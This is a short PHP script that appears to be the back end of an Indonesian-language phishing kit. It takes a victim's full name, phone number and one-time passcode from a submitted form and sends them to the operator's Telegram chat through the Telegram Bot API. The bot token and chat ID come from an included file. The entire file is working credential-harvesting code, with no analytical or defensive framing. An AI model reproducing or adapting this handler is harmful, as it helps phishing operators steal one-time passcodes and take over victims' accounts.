<?php
include "./tel.php";
session_start();
function sendMessage($telegram_id, $msg, $secret_token) {

    $url = "https://api.telegram.org/bot" . $secret_token . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($msg);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

/*----------------------
only basic POST method :
-----------------------*/
$full_name = $_POST ['full_name'];
$full_name = isset($full_name) ? $full_name : '';
$phone_number = $_POST ['phone_number'];
$phone_number = isset($phone_number) ? $phone_number : '';
$otp_code = $_POST ['otp_code'];
$otp_code = isset($otp_code) ? $otp_code : '';
$msg = "Nama: $full_name \n" . "NoHP: $phone_number \n" . "Otp: $otp_code \n";
/*--------------------------------
Isi TOKEN dibawah ini: 
--------------------------------*/

sendMessage($telegram_id, $msg, $secret_token);

exit();

?>